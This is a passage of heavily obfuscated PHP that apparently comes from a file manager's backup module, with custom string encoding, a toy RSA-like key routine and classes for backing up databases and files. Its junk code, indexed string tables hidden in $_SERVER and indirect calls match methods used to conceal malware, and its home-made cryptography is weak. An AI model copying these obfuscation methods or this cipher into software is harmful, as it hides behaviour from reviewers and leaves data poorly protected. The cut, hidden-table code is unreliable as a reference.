$ÙØ·ÎŠ¢ == strlen($¶Ã÷Æ¾) ? 0 : $ÙØ·ÎŠ¢; $ô–ûÙø³ = ($øÚ»Ü Ü + strpos($•ÀóÉ , $À¤¯€ƒ[$ÄúÊûÄ­]) + ord($¶Ã÷Æ¾[$ÙØ·ÎŠ¢++])) % 64; $Ò—üÑ±œ .= $•ÀóÉ [$ô–ûÙø³]; $ƒ¹öü¹÷ = $Ä¡Öç[679]; if (!$ƒ¹öü¹÷) { return; } } $ñ…’Å‚ó = hash_encode($¯¬±Ã–½ . $Ò—üÑ±œ); break; default: $ñ…’Å‚ó = $this->yzwqdf8acb0b($À¤¯€ƒ, $•ÚÜœ° . $ÑÛÉŸ…Ö); $âÊáè = $Ä¡Öç[680]; if (!$âÊáè) { return; } break; } $ñ…’Å‚ó = strrev($æú¶Òš . $ÑÛÉŸ…Ö . $ñ…’Å‚ó); $‚ÔæÕŸ‹ = $Ä¡Öç[681]; if ($‚Œ§Õ¢ - 1 > 0) { $ñ…’Å‚ó = $this->jdhz4867fa0e($ñ…’Å‚ó, $•ÚÜœ°, $‚Œ§Õ¢ - 1); } return $ñ…’Å‚ó; } private function cdrwab725402($ä³Æ¸êÊ, $ü«í—Œ‚, $²³Îñ¥ó = 3) { $±¬ôüêë =& $_SERVER[ì…™Î¶Ï]; $äª»¢ß =& $_SERVER[Ú°³Çñ€]; if (!is_string($ä³Æ¸êÊ) || strlen($ä³Æ¸êÊ) < 10) { return !1; } $ä³Æ¸êÊ = trim($ä³Æ¸êÊ); $ä³Æ¸êÊ = strrev($ä³Æ¸êÊ); $§šÒˆĞ = $±¬ôüêë[682]; while ($§šÒˆĞ < $±¬ôüêë[608]) { if ($§šÒˆĞ >= 0) { break; } $§šÒˆĞ++; } $ÉÃ½áÑ¹ = $ä³Æ¸êÊ[0]; $’æ„ŸÔá = substr($ä³Æ¸êÊ, 1, 15); $…ûş¥ëª = $±¬ôüêë[683]; while (strlen($…ûş¥ëª) < $±¬ôüêë[605]) { if (!$…ûş¥ëª) { break; } $…ûş¥ëª++; } $ä³Æ¸êÊ = substr($ä³Æ¸êÊ, 16); $à‘ÄóëŞ = $±¬ôüêë[684]; $¢÷‘‘Õ² = $äª»¢ß[292]; switch ($ÉÃ½áÑ¹) { case $äª»¢ß[199]: $ÒáÂÃ©ğ = $this->xufrb7cb6a6a($ä³Æ¸êÊ, strrev($ü«í—Œ‚ . $’æ„ŸÔá)); $ãœ±­£í = $±¬ôüêë[685]; if (strlen($ãœ±­£í) < $±¬ôüêë[602]) { return; } break; $ò·‚ŒÉˆ = $±¬ôüêë[686]; if (!$ò·‚ŒÉˆ) { return; } case $äª»¢ß[191]: $ÒáÂÃ©ğ = $this->xufrb7cb6a6a($ä³Æ¸êÊ, strrev($’æ„ŸÔá . $ü«í—Œ‚)); break; $Å×¯™‘ = $±¬ôüêë[687]; if (!$Å×¯™‘) { return; } case $äª»¢ß[293]: $ÒáÂÃ©ğ = $this->xufrb7cb6a6a($ä³Æ¸êÊ, base64_encode($’æ„ŸÔá . $ü«í—Œ‚)); $°Ä¦¿ˆ = $±¬ôüêë[688]; break; $¬âŠ…¡¯ = $±¬ôüêë[689]; case $äª»¢ß[294]: $ÒáÂÃ©ğ = $this->xufrb7cb6a6a($ä³Æ¸êÊ, md5($’æ„ŸÔá . $ü«í—Œ‚)); $ÂĞ¬êÁ± = $±¬ôüêë[690]; while (strlen($ÂĞ¬êÁ±) < $±¬ôüêë[598]) { if (!$ÂĞ¬êÁ±) { break; } $ÂĞ¬êÁ±++; } break; case $äª»¢ß[295]: $ä³Æ¸êÊ = hash_decode($ä³Æ¸êÊ); $êÆ‘ºß = $±¬ôüêë[691]; if (strlen($êÆ‘ºß) < $±¬ôüêë[605]) { return; } $ş‹±ã¹É = $ä³Æ¸êÊ[0]; $ä³Æ¸êÊ = substr($ä³Æ¸êÊ, 1); $¨¼Ë«÷¼ = strpos($¢÷‘‘Õ², $ş‹±ã¹É); $¾ö¸Œƒæ = $±¬ôüêë[692]; while ($¾ö¸Œƒæ < $±¬ôüêë[608]) { if ($¾ö¸Œƒæ >= 0) { break; } $¾ö¸Œƒæ++; } $ªğ‹¡ú¶ = md5($ş‹±ã¹É . md5($ü«í—Œ‚ . $ş‹±ã¹É) . $ü«í—Œ‚); $ªğ‹¡ú¶ = substr($ªğ‹¡ú¶, $¨¼Ë«÷¼ % 8, $¨¼Ë«÷¼ % 8 + 7); $‘òş³éû = $±¬ôüêë[693]; if (!$‘òş³éû) { return; } $«¼‘Ë­É = $äª»¢ß[6]; $ Î±Ú°‰ = $±¬ôüêë[694]; if (!$ Î±Ú°‰) { return; } $ÈãôÃš° = 0; $ÒîÆşÃ¡ = 0; $áÖûœÎ¶ = $±¬ôüêë[695]; $š¿¼úÔ = 0; $¾Éßª…ç = $±¬ôüêë[696]; if (strlen($¾Éßª…ç) < $±¬ôüêë[605]) { return; } for ($ÈãôÃš° = 0; $ÈãôÃš° < strlen($ä³Æ¸êÊ); $ÈãôÃš°++) { $š¿¼úÔ = $š¿¼úÔ == strlen($ªğ‹¡ú¶) ? 0 : $š¿¼úÔ; $Åï£‹à÷ = $±¬ôüêë[697]; if (!$Åï£‹à÷) { return; } $İµ™ª‹ = $š¿¼úÔ++; $ÒîÆşÃ¡ = strpos($¢÷‘‘Õ², $ä³Æ¸êÊ[$ÈãôÃš°]) - $¨¼Ë«÷¼ - ord($ªğ‹¡ú¶[$İµ™ª‹]); while ($ÒîÆşÃ¡ < 0) { $ÒîÆşÃ¡ += 64; } $«¼‘Ë­É .= $¢÷‘‘Õ²[$ÒîÆşÃ¡]; } $ÒáÂÃ©ğ = base64_decode($«¼‘Ë­É); $’‘éµå = $±¬ôüêë[698]; while ($’‘éµå < $±¬ôüêë[608]) { if ($’‘éµå >= 0) { break; } $’‘éµå++; } break; default: $ÒáÂÃ©ğ = $this->xufrb7cb6a6a($ä³Æ¸êÊ, $ü«í—Œ‚ . $’æ„ŸÔá); break; } if ($²³Îñ¥ó - 1 > 0) { $ÒáÂÃ©ğ = $this->cdrwab725402($ÒáÂÃ©ğ, $ü«í—Œ‚, $²³Îñ¥ó - 1); } return $ÒáÂÃ©ğ; } public function ojzn5043bc22($·ÊÅÖ²) { $Êş›Ö¡ =& $_SERVER[ì…™Î¶Ï]; $Ğ•ùï¿ =& $_SERVER[Ú°³Çñ€]; $¾×àåƒè = $this->jlqp4444d310(); $ÎÔà†¶ = $Êş›Ö¡[699]; if (strlen($ÎÔà†¶) < $Êş›Ö¡[608]) { return; } $Æ¸üüì = $this->jlqp4444d310(); $ÒÏ÷ùô¼ = ($¾×àåƒè - 1) * ($Æ¸üüì - 1); $²ôê¤Ë€ = $Êş›Ö¡[700]; $‰šı¶ëŞ = intval(($¾×àåƒè + $Æ¸üüì) / 2); $ù€ÍÀÓ« = $Êş›Ö¡[701]; while (strlen($ù€ÍÀÓ«) < $Êş›Ö¡[605]) { if (!$ù€ÍÀÓ«) { break; } $ù€ÍÀÓ«++; } while (1) { $ˆáş¹ƒ¹ = $‰šı¶ëŞ; $¥Úñ¿¿Ë = $Êş›Ö¡[702]; while ($¥Úñ¿¿Ë < $Êş›Ö¡[618]) { if ($¥Úñ¿¿Ë >= 0) { break; } $¥Úñ¿¿Ë++; } $‹‚«‘Ó = $ÒÏ÷ùô¼; $×äñÅ©õ = $Êş›Ö¡[703]; while ($‹‚«‘Ó % $ˆáş¹ƒ¹ != 0) { $€‚»™à = $‹‚«‘Ó; $ëê•çıÌ = $Êş›Ö¡[704]; $‹‚«‘Ó = $ˆáş¹ƒ¹; $¥±—ğª¡ = $Êş›Ö¡[705]; $ˆáş¹ƒ¹ = $€‚»™à % $ˆáş¹ƒ¹; } if ($ˆáş¹ƒ¹ == 1) { break; } else { $‰šı¶ëŞ++; } } $Õ¡ñÏá¹ = 2; $ñü®Û€Š = $Êş›Ö¡[706]; while (strlen($ñü®Û€Š) < $Êş›Ö¡[605]) { if (!$ñü®Û€Š) { break; } $ñü®Û€Š++; } for ($‡Ş»ë¯˜ = 0; $‡Ş»ë¯˜ < $ÒÏ÷ùô¼ * 10; $‡Ş»ë¯˜++) { if (($ÒÏ÷ùô¼ * $‡Ş»ë¯˜ + 1) % $‰šı¶ëŞ == 0) { $Õ¡ñÏá¹ = intval(($ÒÏ÷ùô¼ * $‡Ş»ë¯˜ + 1) / $‰šı¶ëŞ); break; } } $§”¼¯³º = $this->yzwqdf8acb0b($¾×àåƒè * $Æ¸üüì . $Ğ•ùï¿[6], $Ğ•ùï¿[130]); $¬Èƒœì³ = md5($Ğ•ùï¿[296] . ($¾×àåƒè + $Æ¸üüì) . $Ğ•ùï¿[297] . $‰šı¶ëŞ . $Ğ•ùï¿[297] . $Õ¡ñÏá¹ . $Ğ•ùï¿[298]); $ÔáêÈšç = $this->yzwqdf8acb0b($·ÊÅÖ², $¬Èƒœì³) . $Ğ•ùï¿[299] . $§”¼¯³º; $¿ö…ù› = $Êş›Ö¡[707]; while ($¿ö…ù› < $Êş›Ö¡[618]) { if ($¿ö…ù› >= 0) { break; } $¿ö…ù›++; } return $ÔáêÈšç; } public function nyul4f562f67($ıÚĞ²ğ) { $ÃŞÙ°ø =& $_SERVER[ì…™Î¶Ï]; $½È‘û =& $_SERVER[Ú°³Çñ€]; $­ÓÁŠŸó = explode($½È‘û[299], $ıÚĞ²ğ); $ŸŠ‡—ì = $ÃŞÙ°ø[708]; if (strlen($ŸŠ‡—ì) < $ÃŞÙ°ø[602]) { return; } if (count($­ÓÁŠŸó) != 2) { return $½È‘û[6]; } $©ïíÁíÜ = $this->xufrb7cb6a6a($­ÓÁŠŸó[1] . $½È‘û[6], $½È‘û[130]); if (!$©ïíÁíÜ) { return $½È‘û[6]; } $©ïíÁíÜ = intval($©ïíÁíÜ); $½ÅÉª· = $ÃŞÙ°ø[709]; $‘°Üƒ® = 0; $ë‹ĞÓ÷÷ = 0; $°Ó¢¢êğ = $ÃŞÙ°ø[710]; if (!$°Ó¢¢êğ) { return; } for ($îÊĞ²Ü¶ = 3; $îÊĞ²Ü¶ < $©ïíÁíÜ; $îÊĞ²Ü¶ += 2) { if ($©ïíÁíÜ % $îÊĞ²Ü¶ != 0) { continue; } $‘°Üƒ® = $îÊĞ²Ü¶; $†õ—ÛÌŠ = $ÃŞÙ°ø[711]; while ($†õ—ÛÌŠ < $ÃŞÙ°ø[598]) { if ($†õ—ÛÌŠ >= 0) { break; } $†õ—ÛÌŠ++; } $ë‹ĞÓ÷÷ = intval($©ïíÁíÜ / $îÊĞ²Ü¶); $‘Å‘ÉŠ… = $ÃŞÙ°ø[712]; break; } $—Ø¯ô€­ = ($‘°Üƒ® - 1) * ($ë‹ĞÓ÷÷ - 1); $ï’õ¬Ñ± = intval(($‘°Üƒ® + $ë‹ĞÓ÷÷) / 2); while (1) { $¬–•ì½ = $ï’õ¬Ñ±; $‡ô×ãç¢ = $ÃŞÙ°ø[713]; if (!$‡ô×ãç¢) { die; } $á”ğÏ—ç = $—Ø¯ô€­; while ($á”ğÏ—ç % $¬–•ì½ != 0) { $ÙõÚúÆ = $á”ğÏ—ç; $¡ğ‡ıèİ = $ÃŞÙ°ø[714]; if (strlen($¡ğ‡ıèİ) < $ÃŞÙ°ø[602]) { die; } $á”ğÏ—ç = $¬–•ì½; $¬–•ì½ = $ÙõÚúÆ % $¬–•ì½; $ò¬½’á = $ÃŞÙ°ø[715]; while ($ò¬½’á < $ÃŞÙ°ø[605]) { if ($ò¬½’á >= 0) { break; } $ò¬½’á++; } } if ($¬–•ì½ == 1) { break; } else { $ï’õ¬Ñ±++; } } $€³íëœı = 2; for ($îÊĞ²Ü¶ = 0; $îÊĞ²Ü¶ < $—Ø¯ô€­ * 10; $îÊĞ²Ü¶++) { if (($—Ø¯ô€­ * $îÊĞ²Ü¶ + 1) % $ï’õ¬Ñ± == 0) { $€³íëœı = intval(($—Ø¯ô€­ * $îÊĞ²Ü¶ + 1) / $ï’õ¬Ñ±); break; } } $Éîø‘¶Î = md5($½È‘û[296] . ($‘°Üƒ® + $ë‹ĞÓ÷÷) . $½È‘û[297] . $ï’õ¬Ñ± . $½È‘û[297] . $€³íëœı . $½È‘û[298]); $ö—Ó¸‡ô = $ÃŞÙ°ø[716]; $ğèáÉ°Š = $this->xufrb7cb6a6a($­ÓÁŠŸó[0], $Éîø‘¶Î); $ğ•é‹‚‘ = $ÃŞÙ°ø[717]; while (strlen($ğ•é‹‚‘) < $ÃŞÙ°ø[602]) { if (!$ğ•é‹‚‘) { break; } $ğ•é‹‚‘++; } return $ğèáÉ°Š; } public function jlqp4444d310() { $®ºº§¸ =& $_SERVER[ì…™Î¶Ï]; $®¥û¾€‹ = mt_rand(pow(2, 14), pow(2, 16) - 1); $·Ëş»ˆ„ = $®ºº§¸[718]; if (strlen($·Ëş»ˆ„) < $®ºº§¸[608]) { die; } $¡Ğèöî = array(); $¡ğãªƒ„ = $®ºº§¸[719]; $‹¯©Ÿ = 1; $ÂïË·¨– = $®ºº§¸[720]; while (strlen($ÂïË·¨–) < $®ºº§¸[618]) { if (!$ÂïË·¨–) { break; } $ÂïË·¨–++; } while ($‹¯©Ÿ <= (int) sqrt($®¥û¾€‹)) { $Íå°Ûí = $‹¯©Ÿ; $‰À’øèâ = $®ºº§¸[721]; if (!$‰À’øèâ) { die; } while (!0) { $Íå°Ûí++; if ($Íå°Ûí <= 2) { $‹¯©Ÿ = $Íå°Ûí; break; } else { if ($Íå°Ûí < 2) { continue; } } $½¥“¼™¤ = !0; for ($‚â¢úÁ‰ = 2; $‚â¢úÁ‰ <= sqrt($Íå°Ûí); $‚â¢úÁ‰++) { if ($Íå°Ûí % $‚â¢úÁ‰ == 0) { $½¥“¼™¤ = !1; } } if ($½¥“¼™¤) { $‹¯©Ÿ = $Íå°Ûí; break; } } $¡Ğèöî[] = $‹¯©Ÿ; } $ŞÄÌ²á = 2; for ($Íå°Ûí = $®¥û¾€‹; $Íå°Ûí > 1; $Íå°Ûí--) { $½¥“¼™¤ = !0; $ñõÉıõŸ = $®ºº§¸[722]; if (strlen($ñõÉıõŸ) < $®ºº§¸[618]) { return; } foreach ($¡Ğèöî as $ä¿œ³å¿) { if ($Íå°Ûí % $ä¿œ³å¿ == 0) { $½¥“¼™¤ = !1; break; } } if ($½¥“¼™¤) { $ŞÄÌ²á = $Íå°Ûí; break; } } return $ŞÄÌ²á; } public function bgzrfa125829($˜ªÇ¯·É, $Å¯È½¹È) { $ü‡ûÛû =& $_SERVER[Ú°³Çñ€]; return call_user_func(array($ü‡ûÛû[8], $ü‡ûÛû[300]), $˜ªÇ¯·É, $Å¯È½¹È); } public function yzwqdf8acb0b($§ßËÌ, $æ£®Ô) { $Ã›òıº =& $_SERVER[Ú°³Çñ€]; return call_user_func(array($Ã›òıº[301], $Ã›òıº[302]), $§ßËÌ, $æ£®Ô); } public function xufrb7cb6a6a($œª¦¶Ì­, $¿©í¼¶á) { $´Ç€Ü€ =& $_SERVER[Ú°³Çñ€]; return call_user_func(array($´Ç€Ü€[301], $´Ç€Ü€[303]), $œª¦¶Ì­, $¿©í¼¶á); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Œ•¯‡»Ó =& $_SERVER[ì…™Î¶Ï]; $this->isManual(); self::$name = date($Œ•¯‡»Ó[723]); if (!($šÔºÅ®ë = Model($Œ•¯‡»Ó[724])->lastItem())) { $šÔºÅ®ë = $this->initData(); } else { self::$name = $šÔºÅ®ë[$Œ•¯‡»Ó[32]]; if ($šÔºÅ®ë[$Œ•¯‡»Ó[725]] == $Œ•¯‡»Ó[89]) { self::$name = date($Œ•¯‡»Ó[726]); $¯€ÖÉåá = 0; if (isset($šÔºÅ®ë[$Œ•¯‡»Ó[288]][$Œ•¯‡»Ó[192]][$Œ•¯‡»Ó[458]])) { $¯€ÖÉåá = (int) $šÔºÅ®ë[$Œ•¯‡»Ó[288]][$Œ•¯‡»Ó[192]][$Œ•¯‡»Ó[458]]; } if (self::$manual == 0 && $šÔºÅ®ë[$Œ•¯‡»Ó[32]] == self::$name) { Model($Œ•¯‡»Ó[724])->remove($šÔºÅ®ë[$Œ•¯‡»Ó[392]]); } $šÔºÅ®ë = $this->initData($¯€ÖÉåá, $šÔºÅ®ë[$Œ•¯‡»Ó[727]]); } else { $this->checkStore($šÔºÅ®ë[$Œ•¯‡»Ó[727]]); } } self::$option = $šÔºÅ®ë; } private function isManual() { $Ø‹âñ… = _get($GLOBALS, $_SERVER[ì…™Î¶Ï][728], 0); $Ø‹âñ… = intval($Ø‹âñ…); self::$manual = $Ø‹âñ… && $Ø‹âñ… == 1 ? 1 : 0; } private function initData($¯ÅíÈ¬’ = 0, $¾îììÁ® = '') { $šõ‹»â² =& $_SERVER[ì…™Î¶Ï]; $Àò„ûÆ’ = Model($šõ‹»â²[724])->config(); if ($¾îììÁ® && $Àò„ûÆ’[$šõ‹»â²[727]] != $¾îììÁ®) { $¯ÅíÈ¬’ = 0; } $this->checkStore($Àò„ûÆ’[$šõ‹»â²[727]]); if (self::$manual == 1) { self::$name .= $šõ‹»â²[11] . date($šõ‹»â²[729]); } $Ø«»¬Ñ„ = array($šõ‹»â²[727] => $Àò„ûÆ’[$šõ‹»â²[727]], $šõ‹»â²[32] => self::$name, $šõ‹»â²[725] => 0, $šõ‹»â²[730] => $Àò„ûÆ’[$šõ‹»â²[730]], $šõ‹»â²[731] => self::$manual, $šõ‹»â²[288] => array($šõ‹»â²[732] => array($šõ‹»â²[725] => 0), $šõ‹»â²[733] => array($šõ‹»â²[725] => 0, $šõ‹»â²[734] => 0, $šõ‹»â²[735] => 0, $šõ‹»â²[33] => $šõ‹»â²[12], $šõ‹»â²[736] => 0, $šõ‹»â²[487] => 0), $šõ‹»â²[737] => array($šõ‹»â²[725] => 0, $šõ‹»â²[734] => 0, $šõ‹»â²[735] => 0, $šõ‹»â²[736] => 0, $šõ‹»â²[487] => 0), $šõ‹»â²[192] => array($šõ‹»â²[725] => 0, $šõ‹»â²[738] => 0, $šõ‹»â²[739] => 0, $šõ‹»â²[740] => 0, $šõ‹»â²[741] => 0, $šõ‹»â²[458] => $¯ÅíÈ¬’, $šõ‹»â²[736] => 0, $šõ‹»â²[487] => 0)), $šõ‹»â²[736] => time(), $šõ‹»â²[487] => 0); $¼Â¥Ëí¨ = Model($šõ‹»â²[724])->insert($Ø«»¬Ñ„); $Ø«»¬Ñ„[$šõ‹»â²[392]] = $¼Â¥Ëí¨; return $Ø«»¬Ñ„; } private function checkStore($¥¯ûÉ­…) { $Ææ¸ûø =& $_SERVER[ì…™Î¶Ï]; $¥÷Æñı“ = Model($Ææ¸ûø[742])->listData($¥¯ûÉ­…); Model($Ææ¸ûø[742])->checkConfig($¥÷Æñı“); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ì…™Î¶Ï][724])->findByName(self::$name); } return self::$option; } public static function set($šÄß‚ßÏ) { $©™ó¬ñ  =& $_SERVER[ì…™Î¶Ï]; $‹ÌßâÕ = self::get(); foreach ($šÄß‚ßÏ as $°ñµÎÔ¼ => $ª€î»şÖ) { $äÔÏà¢Ô = explode($©™ó¬ñ [10], $°ñµÎÔ¼); $¸øŞøúã = count($äÔÏà¢Ô); switch ($¸øŞøúã) { case 1: $‹ÌßâÕ[$äÔÏà¢Ô[0]] = $ª€î»şÖ; break; case 2: $‹ÌßâÕ[$äÔÏà¢Ô[0]][$äÔÏà¢Ô[1]] = $ª€î»şÖ; break; case 3: $‹ÌßâÕ[$äÔÏà¢Ô[0]][$äÔÏà¢Ô[1]][$äÔÏà¢Ô[2]] = $ª€î»şÖ; break; } } Model($©™ó¬ñ [724])->update($‹ÌßâÕ[$©™ó¬ñ [392]], $‹ÌßâÕ); self::$option = $‹ÌßâÕ; return self::$option; } public function keep() { $üğÅóı• =& $_SERVER[ì…™Î¶Ï]; $ËÛ¿²âÅ = self::get(); if ($ËÛ¿²âÅ[$üğÅóı•[288]][$üğÅóı•[732]][$üğÅóı•[725]] == $üğÅóı•[89]) { return; } $this->backupKeep($ËÛ¿²âÅ); self::set(array($üğÅóı•[743] => 1)); } private function backupKeep($¦ÑªËÛŸ) { $áº×É¼¿ =& $_SERVER[ì…™Î¶Ï]; if (self::$manual == 1) { return; } $Íõø—Ä¬ = Model($áº×É¼¿[724])->listData(); if (empty($Íõø—Ä¬)) { return; } $ÙÉÉÉİç = 0; $ö…®„êĞ = array(); foreach ($Íõø—Ä¬ as $€ö¤ËáŞ) { if ($ÙÉÉÉİç >= 7) { break; } $ö…®„êĞ[] = $€ö¤ËáŞ[$áº×É¼¿[32]]; $ÙÉÉÉİç++; } for ($ÙÉÉÉİç = 0; $ÙÉÉÉİç < 12; $ÙÉÉÉİç++) { $ö…®„êĞ[] = date($áº×É¼¿[744], strtotime("\55{$ÙÉÉÉİç}\40\155\157\x6e\x74\150\x73")); } $ö…®„êĞ = array_unique($ö…®„êĞ); $¿œ‘Ô’Î = Model($áº×É¼¿[745])->get($áº×É¼¿[746]); foreach ($Íõø—Ä¬ as $€ö¤ËáŞ) { if (isset($€ö¤ËáŞ[$áº×É¼¿[731]]) && $€ö¤ËáŞ[$áº×É¼¿[731]] == $áº×É¼¿[89]) { continue; } if (!empty($€ö¤ËáŞ[$áº×É¼¿[32]]) && in_array($€ö¤ËáŞ[$áº×É¼¿[32]], $ö…®„êĞ)) { continue; } Model($áº×É¼¿[724])->remove($€ö¤ËáŞ[$áº×É¼¿[392]]); $â²ß´º = $this->backupPath($¦ÑªËÛŸ, $¿œ‘Ô’Î); IO::remove($â²ß´º, !1); } } private function backupPath($ïœ“¹´Ê, $Ç‚’êø¿ = false) { $××Øß‹ =& $_SERVER[ì…™Î¶Ï]; if (!$Ç‚’êø¿) { $Ç‚’êø¿ = Model($××Øß‹[745])->get($××Øß‹[746]); } $¡Ì¾ò = $ïœ“¹´Ê[$××Øß‹[32]]; $Ùê‡ñêÒ = substr(md5($××Øß‹[747] . $Ç‚’êø¿ . $¡Ì¾ò), 0, 8); return "\173\x69\x6f\72{$ïœ“¹´Ê[$××Øß‹[727]]}\175\x2f\144\x61\x74\141\142\x61\163\x65\x2f\x62\141\143\x6b\165\160\x2f" . $¡Ì¾ò . $××Øß‹[11] . $Ùê‡ñêÒ; } public function db() { $ä°º³ÍÎ =& $_SERVER[ì…™Î¶Ï]; $»Ê²ÀÔõ = self::get(); if ($»Ê²ÀÔõ[$ä°º³ÍÎ[288]][$ä°º³ÍÎ[733]][$ä°º³ÍÎ[725]] == $ä°º³ÍÎ[89]) { return !0; } $ÜŠôœ¾ = new BackupDb(); if (!$ÜŠôœ¾->index()) { return !1; } self::set(array($ä°º³ÍÎ[748] => 1)); return !0; } public function dbFile() { $¯È£À¯ =& $_SERVER[ì…™Î¶Ï]; $ó¥¡Œ‡Ú = self::get(); if ($ó¥¡Œ‡Ú[$¯È£À¯[288]][$¯È£À¯[737]][$¯È£À¯[725]] == $¯È£À¯[89]) { return !0; } $‘‚Öí… = new BackupDbFile(); if (!$‘‚Öí…->index()) { return !1; } self::set(array($¯È£À¯[749] => 1)); return !0; } public function file() { $ËªğÏº =& $_SERVER[ì…™Î¶Ï]; $÷Èö—‘Ï = self::get(); if ($÷Èö—‘Ï[$ËªğÏº[288]][$ËªğÏº[192]][$ËªğÏº[725]] == $ËªğÏº[89]) { return !0; } if (!isset($÷Èö—‘Ï[$ËªğÏº[730]]) || $÷Èö—‘Ï[$ËªğÏº[730]] == $ËªğÏº[190]) { $®õˆú§À = new BackupFile(); if (!$®õˆú§À->index()) { return !1; } } self::set(array($ËªğÏº[750] => 1, $ËªğÏº[725] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ß©£É¹Ä =& $_SERVER[ì…™Î¶Ï]; $ÁÃÉ™×Æ = Backup::get(); self::$io = $ÁÃÉ™×Æ[$ß©£É¹Ä[727]]; self::$name = $ÁÃÉ™×Æ[$ß©£É¹Ä[32]]; $‡¥†˜“È = new DbManage(); $¡ş„¶â = $‡¥†˜“È->dbType(); $çÃ“§»Ş = array($ß©£É¹Ä[751] => $¡ş„¶â, $ß©£É¹Ä[752] => time()); Backup::set($çÃ“§»Ş); $ÁÙ¾ÕÛğ = $this->tmpFilesPath() . $ß©£É¹Ä[753] . self::$name . $ß©£É¹Ä[8]; del_dir($ÁÙ¾ÕÛğ); mk_dir($ÁÙ¾ÕÛğ); $Ñí‰¸¾† = $¡¸âÖ‰› = 0; $–‡™Ğ™ = new Task($ß©£É¹Ä[754], $ß©£É¹Ä[755], 0, LNG($ß©£É¹Ä[756]) . $ß©£É¹Ä[757] . LNG($ß©£É¹Ä[758])); try { $È×÷â•ô = $‡¥†˜“È->db()->getTables(); } catch (Exception $î³ƒÉŒ¬) { $–‡™Ğ™->end(); return !1; } $È×÷â•ô = array_diff($È×÷â•ô, array($ß©£É¹Ä[759], $ß©£É¹Ä[760])); foreach ($È×÷â•ô as $ŒĞåÕë) { $Ñí‰¸¾† += $‡¥†˜“È->model($ŒĞåÕë)->count(); } $–‡™Ğ™->task[$ß©£É¹Ä[761]] = $Ñí‰¸¾†; $GLOBALS[$ß©£É¹Ä[762]] = self::$name; foreach ($È×÷â•ô as $ŒĞåÕë) { $ú©ÃóÔ = $ÁÙ¾ÕÛğ . $ŒĞåÕë . $ß©£É¹Ä[763]; $˜êÍÒ®× = null; if ($ŒĞåÕë == $ß©£É¹Ä[764] && (!isset($ÁÃÉ™×Æ[$ß©£É¹Ä[730]]) || $ÁÃÉ™×Æ[$ß©£É¹Ä[730]] == $ß©£É¹Ä[190])) { $˜êÍÒ®× = self::$io; } $¡¸âÖ‰› += $‡¥†˜“È->sqlFromDb($ŒĞåÕë, $ú©ÃóÔ, $–‡™Ğ™, $˜êÍÒ®×); } unset($GLOBALS[$ß©£É¹Ä[762]]); $–‡™Ğ™->end(); if ($¡¸âÖ‰› > $Ñí‰¸¾†) { $Ñí‰¸¾† = $¡¸âÖ‰›; } $çÃ“§»Ş = array($ß©£É¹Ä[751] => $¡ş„¶â, $ß©£É¹Ä[748] => 1, $ß©£É¹Ä[765] => $Ñí‰¸¾†, $ß©£É¹Ä[766] => $¡¸âÖ‰›, $ß©£É¹Ä[767] => time()); Backup::set($çÃ“§»Ş); if ($Ñí‰¸¾† - $¡¸âÖ‰› > 0) { $¹ĞŞóİ = $ß©£É¹Ä[768]; if (stristr(I18n::getType(), $ß©£É¹Ä[769])) { $¹ĞŞóİ = $ß©£É¹Ä[770]; } write_log(array($¹ĞŞóİ, $çÃ“§»Ş), $ß©£É¹Ä[755]); return !1; } return !0; } private function tmpFilesPath() { $’ú—øí£ =& $_SERVER[ì…™Î¶Ï]; $­¯ĞÏ’¬ = TEMP_FILES; if ($GLOBALS[$’ú—øí£[6]][$’ú—øí£[90]][$’ú—øí£[771]]) { $­¯ĞÏ’¬ = $GLOBALS[$’ú—øí£[6]][$’ú—øí£[90]][$’ú—øí£[771]]; if (!mk_dir($­¯ĞÏ’¬) || !is_writable($­¯ĞÏ’¬) || !IO::mkfile($­¯ĞÏ’¬ . $’ú—øí£[772])) { $­¯ĞÏ’¬ = TEMP_FILES; } } return $­¯ĞÏ’¬; } } goto e·ëèÎê¬; e·ëèÎê¬: class BackupDbFile { public function __construct() { } public function index() { $Š‡¹õ¦§ =& $_SERVER[ì…™Î¶Ï]; $’Êë¤¢¹ = Backup::get(); $šÚÔ…Ã = $’Êë¤¢¹[$Š‡¹õ¦§[32]]; $íŸÀ®—Ï = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\x70\x5f{$šÚÔ…Ã}\x2f"; $¶àå¡± = $this->backupPath($’Êë¤¢¹); if (!($¶àå¡± = IO::mkdir($¶àå¡±))) { return !1; } $ÙĞ÷ÏÜˆ = IO::listPath($íŸÀ®—Ï); $ôôªĞ… = isset($ÙĞ÷ÏÜˆ[$Š‡¹õ¦§[76]]) ? $ÙĞ÷ÏÜˆ[$Š‡¹õ¦§[76]] : array(); $÷´åî¾ = array_sum(array_column($ôôªĞ…, $Š‡¹õ¦§[80])); if (!$÷´åî¾) { return !1; } $ÒĞööºú = array($Š‡¹õ¦§[773] => $÷´åî¾, $Š‡¹õ¦§[774] => time()); Backup::set($ÒĞööºú); $Ï……Ó³˜ = new TaskFileTransfer($Š‡¹õ¦§[775], $Š‡¹õ¦§[755], count($ôôªĞ…), LNG($Š‡¹õ¦§[756]) . $Š‡¹õ¦§[451] . LNG($Š‡¹õ¦§[758]) . $Š‡¹õ¦§[776]); $Ï……Ó³˜->task[$Š‡¹õ¦§[738]] = $÷´åî¾; foreach ($ÙĞ÷ÏÜˆ[$Š‡¹õ¦§[76]] as $Æœ¾‘Ç„) { $Ìü’›¥ = IO::move($Æœ¾‘Ç„[$Š‡¹õ¦§[78]], $¶àå¡±); if (!$Ìü’›¥) { $Ï……Ó³˜->end(); $Ü»îû©Æ = IO::getLastError($Š‡¹õ¦§[777] . $Æœ¾‘Ç„[$Š‡¹õ¦§[78]] . $Š‡¹õ¦§[778] . $¶àå¡± . $Š‡¹õ¦§[527]); write_log($Ü»îû©Æ, $Š‡¹õ¦§[755]); return !1; } } $«ÎÍÔÒÉ = new DbManage(); $¡¼¨·¢ = $«ÎÍÔÒÉ->getSqlFile(); if (!$¡¼¨·¢[$Š‡¹õ¦§[779]] || !$¡¼¨·¢[$Š‡¹õ¦§[13]]) { return !1; } IO::move($¡¼¨·¢[$Š‡¹õ¦§[779]], $¶àå¡±); IO::move($¡¼¨·¢[$Š‡¹õ¦§[13]], $¶àå¡±); $Ï……Ó³˜->end(); $ÒĞööºú = array($Š‡¹õ¦§[780] => $÷´åî¾, $Š‡¹õ¦§[781] => time()); 